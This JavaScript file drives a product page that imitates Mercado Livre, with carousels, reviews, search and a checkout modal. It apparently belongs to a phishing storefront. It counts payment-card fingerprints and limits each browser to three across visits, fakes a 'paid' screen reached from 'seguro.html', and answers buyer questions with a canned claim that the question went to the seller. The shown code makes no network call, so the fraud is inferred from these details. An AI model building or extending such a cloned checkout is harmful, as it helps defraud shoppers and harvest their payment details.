    return `<li class="pcard">
      <div class="pcard__img">
        <img src="${relImg(p.img, 's')}" width="340" height="340" loading="lazy" decoding="async" alt="${esc(p.t)}">
      </div>
      <div class="pcard__body">
        <h3 class="pcard__title">${esc(p.t)}</h3>
        ${p.old ? `<p class="pcard__old">R$ ${p.old}</p>` : ''}
        <p class="pcard__price">
          ${p.off ? `<span class="pcard__off">${p.off}</span>` : ''}
          <span class="amount">${supPrice(p.p)}</span>
          ${p.sold ? `<small>${p.sold}</small>` : ''}
        </p>
        ${p.pix ? '<p class="pcard__pix">no Pix</p>' : ''}
        <p><span class="pcard__mp">20% OFF no saldo</span></p>
        ${p.ship ? `<p class="pcard__ship">Frete grátis ${p.full ? '<span class="full-tag">FULL</span>' : ''}</p>` : ''}
      </div>
      <button class="pcard__buy" type="button" data-buy="${esc(p.t)}" data-price="${p.p}"
              aria-label="Adicionar ${esc(p.t)} ao carrinho">Adicionar ao carrinho</button>
    </li>`;
  }

  /** Compra direta a partir de um card de carrossel — adiciona ao carrinho e abre o checkout. */
  function bindCardBuy(track) {
    track.addEventListener('click', e => {
      const btn = e.target.closest('.pcard__buy');
      if (!btn) return;

      const price = parseFloat(btn.dataset.price.replace(',', '.'));
      const title = btn.dataset.buy;
      const existing = extraItems.find(i => i.title === title);
      if (existing) {
        existing.qty += 1;
      } else {
        extraItems.push({ title, price, qty: 1 });
      }

      cart += 1;
      $('#cartCount').textContent = String(cart);
      $('#cartBtn').setAttribute('aria-label', `Carrinho com ${cart} produtos`);

      const shortTitle = title.length > 32 ? title.slice(0, 32) + '…' : title;
      toast(`"${shortTitle}" adicionado ao carrinho.`);

      updateCheckout();

      if (cho.hidden) {
        clearTimeout(loadTimer);
        clearInterval(pollTimer);
        doneView.hidden = true;
        current = 1;
        renderSteps();
        cho.querySelector('.cho__scroll').scrollTop = 0;
        showLoading('Preparando tudo para<br>sua compra');
    if (window.ML_ANALYTICS) window.ML_ANALYTICS.track('add_to_cart', 'Abriu checkout / carrinho');
        openModal(cho);
        hideLoadingAfter(1500, () => showSeguro(() => $('#fCep').focus()));
      }
    });
  }

  $('#relTrack').innerHTML = RELATED.map(cardHTML).join('');
  $('#storeTrack').innerHTML = STORE.map(cardHTML).join('');
  [$('#relTrack'), $('#storeTrack')].forEach(bindCardBuy);

  $$('[data-carousel]').forEach(carousel => {
    const track = $('.carousel__track', carousel);
    const [prev, next] = $$('.carousel__arrow', carousel);

    const update = () => {
      const max = track.scrollWidth - track.clientWidth;
      prev.disabled = track.scrollLeft <= 4;
      next.disabled = track.scrollLeft >= max - 4;
    };

    $$('.carousel__arrow', carousel).forEach(arrow => arrow.addEventListener('click', () => {
      track.scrollBy({ left: Number(arrow.dataset.dir) * (track.clientWidth - 40), behavior: 'smooth' });
    }));
    track.addEventListener('scroll', update, { passive: true });

    // reavalia quando as imagens carregam ou o container muda de tamanho
    if ('ResizeObserver' in window) new ResizeObserver(update).observe(track);
    $$('img', track).forEach(img => img.addEventListener('load', update, { once: true }));
    update();
  });

  /* ---------- Aside e anúncio ---------- */
  function adRowHTML(p, opts) {
    const o = opts || {};
    return `<li class="adrow">
      <div class="adrow__img">
        <img src="${relImg(p.img, 'xs')}" width="124" height="124" loading="lazy" decoding="async" alt="${esc(p.t)}">
      </div>
      <div class="adrow__body">
        <p class="adrow__title">${esc(p.t)}</p>
        ${o.seller ? `<p class="adrow__seller">Por JBL ${icon('i-check', 'verified')}</p>` : ''}
        ${p.off && !o.seller ? `<p class="adrow__discount"><span class="pcard__off">${p.off}</span><s>R$ ${p.old}</s></p>` : ''}
        <p class="adrow__price">${supPrice(p.p)}${o.seller && p.old ? `<s>R$ ${p.old}</s>` : ''}${p.sold ? `<small>${p.sold}</small>` : ''}</p>
        ${p.pix ? '<p class="adrow__pix">no Pix</p>' : ''}
        ${o.seller ? '' : `<p><span class="pcard__mp">20% OFF no saldo</span></p>
        <p class="pcard__ship">Frete grátis ${p.full ? '<span class="full-tag">FULL</span>' : ''}</p>`}
      </div>
    </li>`;
  }
  $('#asideList').innerHTML = ASIDE.map(p => adRowHTML(p)).join('');

  /* ======================= FOTOS DO PRODUTO ======================= */
  const photosEl = $('#photos');
  const photoImg = (p, i) =>
    `<img src="${p.zoom}" width="${p.zw}" height="${p.zh}" data-i="${i}"
          loading="lazy" decoding="async" alt="${esc(p.alt)}">`;

  photosEl.innerHTML =
    PHOTOS.slice(0, 2).map((p, i) => photoImg(p, i)).join('') +
    '<div class="photos__hidden" id="photosHidden" hidden>' +
    PHOTOS.slice(2).map((p, i) => photoImg(p, i + 2)).join('') +
    '</div>';

  photosEl.addEventListener('click', e => {
    const img = e.target.closest('img');
    if (!img) return;
    openLightbox(Number(img.dataset.i), PHOTOS.map(p => ({ src: p.zoom, thumb: p.thumb, alt: p.alt, w: p.zw, h: p.zh })));
  });

  /* ============================ TOGGLES ============================ */
  function bindToggle(btn, target, labelClosed, labelOpen, opts) {
    const o = opts || {};
    const textEl = $('.toggle-link__text', btn);
    btn.addEventListener('click', () => {
      const open = btn.getAttribute('aria-expanded') !== 'true';
      btn.setAttribute('aria-expanded', String(open));
      textEl.textContent = open ? labelOpen : labelClosed;

      if (o.useHidden) target.hidden = !open;
      else target.classList.toggle('is-open', open);

      if (o.fade) o.fade.classList.toggle('is-open', open);
      if (!open) btn.scrollIntoView({ block: 'center' });
    });
  }
  bindToggle($('#specsToggle'), $('#specsMore'), 'Conferir todas as características', 'Ver menos características', { useHidden: true, fade: $('#specFade') });
  bindToggle($('#photosToggle'), $('#photosHidden'), 'Ver mais imagens', 'Ver menos imagens', { useHidden: true });
  bindToggle($('#descToggle'), $('#desc'), 'Ver descrição completa', 'Ver menos', { fade: $('#descFade') });

  /* ============================ PERGUNTAS ============================ */
  const questions = [];
  const qList = $('#qList');
  const qInput = $('#qInput');

  $('#qForm').addEventListener('submit', e => {
    e.preventDefault();
    const value = qInput.value.trim();
    if (!value) { qInput.focus(); return; }
    questions.unshift({
      q: value,
      a: 'Olá! Sua pergunta foi enviada ao vendedor. A resposta aparece aqui em até 24 h.',
      when: 'agora'
    });
    qInput.value = '';
    qList.innerHTML = questions.map(item => `
      <li class="qitem">
        <p class="qitem__q">${esc(item.q)}</p>
        <p class="qitem__a">${icon('i-right')}${item.a}</p>
        <p class="qitem__meta">${item.when}</p>
      </li>`).join('');
    toast('Pergunta enviada ao vendedor.');
  });

  /* ============================ OPINIÕES ============================ */
  $('#bars').innerHTML = BARS.map(b => `
    <button class="bar" type="button" data-rate="${b.star}" aria-pressed="false"
            aria-label="Filtrar por ${b.star} estrela${b.star > 1 ? 's' : ''} (${b.pct}%)">
      <span class="bar__track"><span class="bar__fill" style="width:${b.pct}%"></span></span>
      <span class="bar__lbl" aria-hidden="true">${b.star} ${icon('i-star')}</span>
    </button>`).join('');

  $('#rphotos').innerHTML = REVIEW_PHOTOS.map((n, i) => `
    <li>
      <button class="rphoto" type="button" data-i="${i}" aria-label="Ver foto ${i + 1} enviada por cliente">
        <img src="${revThumb(n)}" width="176" height="220" loading="lazy" decoding="async" alt="">
        <span aria-hidden="true">5 ${icon('i-star')}</span>
      </button>
    </li>`).join('');

  $('#rphotos').addEventListener('click', e => {
    const btn = e.target.closest('.rphoto');
    if (!btn) return;
    openLightbox(Number(btn.dataset.i), REVIEW_PHOTOS.map(n => ({
      src: revFull(n), thumb: revThumb(n), alt: 'Foto enviada por cliente'
    })));
  });

  const rlist = $('#rlist');
  const revToggle = $('#revToggle');
  const PAGE = 3;
  let sortMode = 'rel';
  let rateFilter = 0;
  let showAll = false;

  function filteredReviews() {
    const list = REVIEWS.filter(r => !rateFilter || r.rate === rateFilter);
    const by = {
      new: (a, b) => a.ageDays - b.ageDays,
      high: (a, b) => b.rate - a.rate || b.likes - a.likes,
      low: (a, b) => a.rate - b.rate || b.likes - a.likes,
      rel: (a, b) => b.likes - a.likes
    };
    return list.sort(by[sortMode] || by.rel);
  }

  function renderReviews() {
    const list = filteredReviews();
    const visible = showAll ? list : list.slice(0, PAGE);

    rlist.innerHTML = visible.length
      ? visible.map(r => {
        const long = r.text.length > 260;
        return `<article class="review">
          <div class="review__head">
            <span class="stars" aria-hidden="true">${[1, 2, 3, 4, 5].map(n => star(n <= r.rate)).join('')}</span>
            <span class="sr">Nota ${r.rate} de 5.</span>
            <span class="review__meta">${r.country} <i aria-hidden="true"></i> ${r.when}</span>
          </div>
          ${r.text ? `<p class="review__text${long ? ' is-clamped' : ''}">${esc(r.text).replace(/😂/g, '<svg width="16" height="16" aria-hidden="true" focusable="false" style="vertical-align:-3px"><use href="#i-smile"/></svg>')}</p>` : ''}
          ${long ? '<button class="review__more" type="button" aria-expanded="false">Saiba mais</button>' : ''}
          ${r.pics ? `<div class="review__pics">${r.pics.map(n => `
            <button type="button" data-pic="${n}" aria-label="Ampliar foto da opinião">
              <img src="${revThumb(n)}" width="176" height="220" loading="lazy" decoding="async" alt="">
            </button>`).join('')}</div>` : ''}
          <div class="review__foot">
            <button class="review__like" type="button" aria-pressed="false">
              ${icon('i-thumb')} Útil <b>${r.likes}</b>
            </button>
            <button class="review__like" type="button" aria-label="Mais opções desta opinião">${icon('i-dots')}</button>
          </div>
        </article>`;
      }).join('')
      : '<p class="rlist__empty">Nenhuma opinião com esse filtro.</p>';

    revToggle.hidden = list.length <= PAGE;
    if (revToggle.hidden && showAll) {
      showAll = false;
      revToggle.setAttribute('aria-expanded', 'false');
      $('.toggle-link__text', revToggle).textContent = 'Mostrar todas as opiniões';
    }

    $('#rcount').textContent = rateFilter
      ? `${list.length} comentário${list.length === 1 ? '' : 's'} com ${rateFilter} estrela${rateFilter > 1 ? 's' : ''}`
      : '1.192 comentários';
  }

  rlist.addEventListener('click', e => {
    const more = e.target.closest('.review__more');
    if (more) {
      const text = more.previousElementSibling;
      const clamped = text.classList.toggle('is-clamped');
      more.textContent = clamped ? 'Saiba mais' : 'Ver menos';
      more.setAttribute('aria-expanded', String(!clamped));
      return;
    }
    const like = e.target.closest('.review__like');
    if (like && $('b', like)) {
      const counter = $('b', like);
      const on = like.getAttribute('aria-pressed') !== 'true';
      like.setAttribute('aria-pressed', String(on));
      counter.textContent = String(Number(counter.textContent) + (on ? 1 : -1));
      return;
    }
    const pic = e.target.closest('[data-pic]');
    if (pic) {
      const all = filteredReviews().flatMap(r => r.pics || []);
      const n = Number(pic.dataset.pic);
      openLightbox(all.indexOf(n), all.map(k => ({
        src: revFull(k), thumb: revThumb(k), alt: 'Foto enviada por cliente'
      })));
    }
  });

  revToggle.addEventListener('click', () => {
    showAll = !showAll;
    revToggle.setAttribute('aria-expanded', String(showAll));
    $('.toggle-link__text', revToggle).textContent = showAll ? 'Mostrar menos opiniões' : 'Mostrar todas as opiniões';
    renderReviews();
  });

  /* ---------- filtros (chips + barras) ---------- */
  function syncRateUI() {
    const label = rateFilter ? `${rateFilter} estrela${rateFilter > 1 ? 's' : ''}` : 'Qualificação';
    $('.chip__text', rateChip).textContent = label;
    rateChip.classList.toggle('is-on', Boolean(rateFilter));
    $$('#rateMenu li').forEach(li => li.setAttribute('aria-selected', String(Number(li.dataset.rate) === rateFilter)));
    $$('.bar').forEach(b => b.setAttribute('aria-pressed', String(Number(b.dataset.rate) === rateFilter)));
  }

  const sortChip = $('#sortChip');
  const rateChip = $('#rateChip');

  bindMenu(sortChip, $('#sortMenu'), li => {
    sortMode = li.dataset.sort;
    $$('#sortMenu li').forEach(x => x.setAttribute('aria-selected', String(x === li)));
    $('.chip__text', sortChip).textContent = li.textContent;
    sortChip.classList.add('is-on');
    renderReviews();
  });

  bindMenu(rateChip, $('#rateMenu'), li => {
    rateFilter = Number(li.dataset.rate);
    syncRateUI();
    renderReviews();
  });

  $('#bars').addEventListener('click', e => {
    const bar = e.target.closest('.bar');
    if (!bar) return;
    const value = Number(bar.dataset.rate);
    rateFilter = value === rateFilter ? 0 : value;
    syncRateUI();
    renderReviews();
  });

  renderReviews();

  /* ---------- infraestrutura de menus ---------- */
  function closeAllMenus() {
    $$('.dropdown.is-open,.qty__menu.is-open').forEach(m => {
      m.classList.remove('is-open');
      const owner = $(`[aria-controls="${m.id}"]`);
      if (owner) owner.setAttribute('aria-expanded', 'false');
    });
    const suggest = $('#suggest');
    suggest.classList.remove('is-open');
    $('#q').setAttribute('aria-expanded', 'false');
  }

  function bindMenu(button, menu, onPick) {
    button.addEventListener('click', e => {
      e.stopPropagation();
      const open = !menu.classList.contains('is-open');
      closeAllMenus();
      menu.classList.toggle('is-open', open);
      button.setAttribute('aria-expanded', String(open));
      if (open) ($('li[aria-selected="true"]', menu) || $('li', menu)).focus();
    });
    menu.addEventListener('click', e => {
      const li = e.target.closest('li');
      if (!li) return;
      onPick(li);
      closeAllMenus();
      button.focus();
    });
    listboxKeys(menu, button, onPick);
  }

  /** Navegação por teclado em listboxes (setas, Home/End, Enter/Espaço). */
  function listboxKeys(menu, owner, onPick) {
    menu.addEventListener('keydown', e => {
      const items = $$('li', menu);
      const current = items.indexOf(document.activeElement);
      let next = -1;
      if (e.key === 'ArrowDown') next = Math.min(current + 1, items.length - 1);
      else if (e.key === 'ArrowUp') next = Math.max(current - 1, 0);
      else if (e.key === 'Home') next = 0;
      else if (e.key === 'End') next = items.length - 1;
      else if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        if (current >= 0) { onPick(items[current]); closeAllMenus(); owner.focus(); }
        return;
      } else return;
      e.preventDefault();
      items[next].focus();
    });
  }

  document.addEventListener('click', closeAllMenus);

  /* ============================ BUSCA ============================ */
  const qField = $('#q');
  const suggest = $('#suggest');
  let sugIndex = -1;

  function renderSuggestions() {
    const term = qField.value.trim().toLowerCase();
    const hits = term ? SUGGESTIONS.filter(s => s.includes(term)) : [];
    sugIndex = -1;
    suggest.innerHTML = hits.map((h, i) =>
      `<li role="option" id="sug-${i}" aria-selected="false">${icon('i-search')}${esc(h)}</li>`).join('');
    suggest.classList.toggle('is-open', hits.length > 0);
    qField.setAttribute('aria-expanded', String(hits.length > 0));
    qField.removeAttribute('aria-activedescendant');
  }

  function moveSuggestion(delta) {
    const items = $$('li', suggest);
    if (!items.length) return;
    sugIndex = (sugIndex + delta + items.length) % items.length;
    items.forEach((li, i) => {
      const on = i === sugIndex;
      li.classList.toggle('is-active', on);
      li.setAttribute('aria-selected', String(on));
    });
    qField.setAttribute('aria-activedescendant', items[sugIndex].id);
  }

  qField.addEventListener('input', renderSuggestions);
  qField.addEventListener('keydown', e => {
    if (!suggest.classList.contains('is-open')) return;
    if (e.key === 'ArrowDown') { e.preventDefault(); moveSuggestion(1); }
    else if (e.key === 'ArrowUp') { e.preventDefault(); moveSuggestion(-1); }
    else if (e.key === 'Enter' && sugIndex >= 0) {
      e.preventDefault();
      qField.value = $$('li', suggest)[sugIndex].textContent.trim();
      closeAllMenus();
    }
  });
  suggest.addEventListener('mousedown', e => {
    const li = e.target.closest('li');
    if (!li) return;
    e.preventDefault();
    qField.value = li.textContent.trim();
    closeAllMenus();
  });
  qField.addEventListener('blur', () => setTimeout(closeAllMenus, 120));

  $('#searchForm').addEventListener('submit', e => {
    e.preventDefault();
    closeAllMenus();
  });

  /* ==================== NAVEGAÇÃO INTERNA (SPA) ==================== */
  document.addEventListener('click', e => {
    const link = e.target.closest('a[href^="#"]');
    if (!link || link.dataset.noscroll !== undefined) return;
    e.preventDefault();
    const id = link.getAttribute('href').slice(1);
    const target = id ? document.getElementById(id) : null;
    if (target) {
      target.scrollIntoView({ block: 'start' });
      if (!target.hasAttribute('tabindex')) target.setAttribute('tabindex', '-1');
      target.focus({ preventScroll: true });
    } else {
      window.scrollTo({ top: 0 });
    }
  });

  /* ---------- estado inicial ---------- */
  setQty(1);

  // Se o navegador já bateu o limite de 3 cartões numa visita anterior,
  // já abre o checkout sem a opção de cartão.
  if (_getCardFps().length >= CARD_LIMIT) disableCardOption();

  /* ============================ VARIANTES (Cor / Voltagem / Potência) ============================ */
  function rebuildThumbs() {
    thumbsEl.innerHTML = activeGallery.map((g, i) => `
      <button class="thumb${i === 0 ? ' is-active' : ''}" type="button" data-i="${i}"
              aria-current="${i === 0}" aria-label="Ver imagem ${i + 1} de ${activeGallery.length}">
        <img src="${g.thumb}" width="112" height="112" decoding="async" alt="">
        ${g.type === 'video' ? `<span class="thumb__play">${icon('i-play')}</span>` : ''}
      </button>`).join('');
    $$('.thumb', thumbsEl).forEach(btn => {
      const go = () => setGallery(Number(btn.dataset.i));
      btn.addEventListener('mouseenter', go);
      btn.addEventListener('click', go);
      btn.addEventListener('focus', go);
    });
    setGallery(0);
  }

  // Tela de obrigado: quando vindo de seguro.html com ?paid=1
  if (new URLSearchParams(location.search).has('paid')) {
    openModal(cho);
    $$('.step', cho).forEach(s => s.hidden = true);
    const _sv = $('#choSeguro'); if (_sv) _sv.hidden = true;
    doneView.hidden = true;
    showPaidScreen();
  }

  [
    {
      optsId: 'varCorOpts', labelId: 'varCorLabel',
      onSelect: label => {
        activeGallery = COLOR_GALLERIES[label] || GALLERY;
        rebuildThumbs();
      }
    },
    { optsId: 'varVoltOpts', labelId: 'varVoltLabel' },
    { optsId: 'varPotOpts',  labelId: 'varPotLabel'  }
  ].forEach(({ optsId, labelId, onSelect }) => {
    const opts    = $('#' + optsId);
    const labelEl = $('#' + labelId);
    if (!opts || !labelEl) return;
    opts.addEventListener('click', e => {
      const btn = e.target.closest('.var-btn');
      if (!btn) return;
      $$('.var-btn', opts).forEach(b => { b.classList.remove('is-sel'); b.setAttribute('aria-pressed', 'false'); });
      btn.classList.add('is-sel');
      btn.setAttribute('aria-pressed', 'true');
      labelEl.textContent = btn.dataset.label;
      if (onSelect) onSelect(btn.dataset.label);
    });
  });
})();
